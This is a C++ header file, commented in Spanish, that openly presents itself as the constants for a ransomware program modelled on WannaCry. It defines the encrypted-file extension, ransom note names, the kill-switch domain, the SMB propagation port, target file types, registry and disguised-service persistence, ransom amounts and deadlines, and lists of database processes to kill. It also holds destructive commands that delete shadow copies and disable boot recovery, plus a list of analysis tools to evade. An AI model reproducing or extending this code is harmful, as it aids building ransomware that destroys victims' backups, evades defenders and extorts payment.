#ifndef CONSTANTS_HPP
#define CONSTANTS_HPP

#include <string>
#include <vector>
#include <map>
#include <array>

/**
 * @namespace Constants
 * @brief Espacio de nombres que contiene todas las constantes utilizadas en el ransomware.
 *
 * Este espacio de nombres contiene definiciones de valores constantes utilizados
 * en todo el sistema, lo que facilita la modificación centralizada de estos valores
 * y promueve la consistencia en el código.
 */

namespace Constants
{
    /**
     * @namespace Encryption
     * @brief Constantes relacionadas con la encriptación de archivos.
     */
    namespace Encryption
    {
        // Algoritmos
        const std::string RSA_ALGORITHM = "RSA-2048";
        const std::string AES_ALGORITHM = "AES-128-CBC";

        // Tamaños de clave
        constexpr int RSA_KEY_SIZE = 2048;
        constexpr int AES_KEY_SIZE = 128;

        // Extensión para archivos cifrados
        const std::string ENCRYPTED_EXTENSION = ".WNCRY";

        // Nombre del archivo de recuperación
        const std::string RECOVERY_FILE = "@WanaDecryptor.exe";
        const std::string RECOVERY_INSTRUCTIONS = "@Please_Read_Me@.txt";

        // Rutas para archivos de claves
        const std::string PUBLIC_KEY_RESOURCE = "PUBLIC_KEY";

        // Tamaño de buffer para operaciones de cifrado
        constexpr size_t ENCRYPTION_BUFFER_SIZE = 4096; // 4KB
    }

    /**
     * @namespace Network
     * @brief Constantes relacionadas con la comunicación de red y propagación.
     */
    namespace Network
    {
        // Puertos para propagación y escaneo
        constexpr int SMB_PORT = 445;
        constexpr int HTTP_PORT = 80;
        constexpr int HTTPS_PORT = 443;

        // Timeouts (en milisegundos)
        constexpr int CONNECTION_TIMEOUT = 5000;
        constexpr int REQUEST_TIMEOUT = 10000;

        // Parámetros de red
        constexpr int MAX_CONNECTION_RETRIES = 3;
        constexpr int MAX_CONCURRENT_CONNECTIONS = 100;

        // Protocolo de comunicación con C2
        const std::string C2_PROTOCOL_VERSION = "1.0";

        // Kill switch domain
        const std::string KILL_SWITCH_DOMAIN = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
    }

    /**
     * @namespace FileSystem
     * @brief Constantes relacionadas con el sistema de archivos.
     */

    namespace FileSystem
    {
        // Extensiones de archivo objetivo (archivos a cifrar)
        const std::array<const char *, 25> TARGET_EXTENSIONS = {
            ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg",
            ".png", ".txt", ".rtf", ".zip", ".rar", ".7z", ".mp3", ".mp4", ".mov", ".avi",
            ".psd", ".ai", ".cdr", ".svg", ".sql", ".mdb"};

        // Directorios a excluir del cifrado
        const std::vector<std::string> EXCLUDE_DIRECTORIES = {
            "Windows",
            "Program Files",
            "Program Files (x86)",
            "ProgramData",
            "AppData"};

        // Archivos a excluir del cifrado
        const std::vector<std::string> EXCLUDED_FILES = {
            "desktop.ini",
            "autorun.inf",
            "@WanaDecryptor@.exe",
            "@Please_Read_Me@.txt",
            "m_russian.wnry",
            "m_english.wnry",
            "m_chinese.wnry"};

        // Máximo número de archivos a procesar por lote
        constexpr int MAX_FILE_PER_BATCH = 1000;
    }

    /**
     * @namespace Persistence
     * @brief Constantes relacionadas con la persistencia en el sistema.
     */
    namespace Persistence
    {
        // Nombres de mutexes para evitar múltiples infecciones
        const std::string MUTEX_NAME = "Global\\MsWinZonesCacheCounterMutexA";

        // Claves de registro para persistencia
        const std::string REGISTRY_RUN_KEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        const std::string REGISTRY_RUN_VALUE = "Microsoft Windows Manager";

        // Nombre del servicio (si se utiliza un servicio)
        const std::string SERVICE_NAME = "WanaCrypt0r";
        const std::string SERVICE_DISPLAY_NAME = "Windows Security Manager";
        const std::string SERVICE_DESCRIPTION = "Provides security services for Windows applications";
    }

    /**
     * @namespace Payment
     * @brief Constantes relacionadas con el proceso de pago.
     */
    namespace Payment
    {
        // Montos del rescate
        constexpr int INITIAL_AMOUNT_USD = 300;
        constexpr int INCREASED_AMOUNT_USD = 600;

        // Tiempos límite (en horas)
        constexpr int INITIAL_TIME_LIMIT = 72;   // 3 días
        constexpr int EXTENDED_TIME_LIMIT = 168; // 7 días

        // Bitcoin
        const std::string BITCOIN_ADDRESS_PREFIX = "bc1";
        constexpr int MINIMUM_CONFIRMATIONS = 3;
    }

    /**
     * @namespace UI
     * @brief Constantes relacionadas con la interfaz de usuario.
     */
    namespace UI
    {
        // Nombres de archivos de recursos para la UI
        const std::string RESOURCE_BACKGROUND = "b.wnry";
        const std::string RESOURCE_FONT = "c.wnry";
        const std::string RESOURCE_ICON = "u.wnry";

        // Idiomas disponibles
        const std::vector<std::string> SUPPORTED_LANGUAGES = {
            "english", "chinese", "russian", "french", "spanish", "portuguese",
            "german", "japanese", "korean", "arabic", "italian"};

        // Prefijos de archivos de idiomas
        const std::string LANGUAGE_FILE_PREFIX = "m_";
        const std::string LANGUAGE_FILE_EXTENSION = ".wnry";

        // Tamaño de la ventana de la UI
        constexpr int WINDOW_WIDTH = 800;
        constexpr int WINDOW_HEIGHT = 600;
    }

    /**
     * @namespace System
     * @brief Constantes relacionadas con el sistema operativo.
     */
    namespace System
    {
        // Nombres de procesos y servicios a terminar
        const std::vector<std::string> PROCESSES_TO_KILL = {
            "mysql.exe", "sqlserver.exe", "oracle.exe", "ocssd.exe",
            "dbsnmp.exe", "synctime.exe", "apache.exe", "nginx.exe"};

        // Servicios a detener
        const std::vector<std::string> SERVICES_TO_STOP = {
            "MSSQLSERVER", "SQLSERVERAGENT", "MSSQL$SQLEXPRESS",
            "MySQL", "Apache2.4", "tomcat6", "tomcat7", "OracleServiceXE"};

        // Comandos del sistema para ejecutar
        const std::string CMD_DELETE_SHADOW_COPIES = "cmd.exe /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete";
        const std::string CMD_DISABLE_RECOVERY = "cmd.exe /c bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no";
    }

    /**
     * @namespace Debug
     * @brief Constantes relacionadas con depuración y anti-análisis.
     */
    namespace Debug
    {
        // Nombres de herramientas de análisis a detectar
        const std::vector<std::string> ANALYSIS_TOOLS = {
            "wireshark", "processhacker", "procmon", "procexp", "ida", "ollydbg",
            "ghidra", "x64dbg", "windbg", "immunity", "fiddler", "tcpview"};

        // Métodos de anti-análisis
        const std::vector<std::string> ANTI_ANALYSIS_METHODS = {
            "CheckDebugger", "CheckVirtualMachine", "CheckSandbox", "SleepTechnique",
            "TimingCheck", "ProcessCheck", "RegistryCheck"};
    }

}

#endif // CONSTANTS_HPP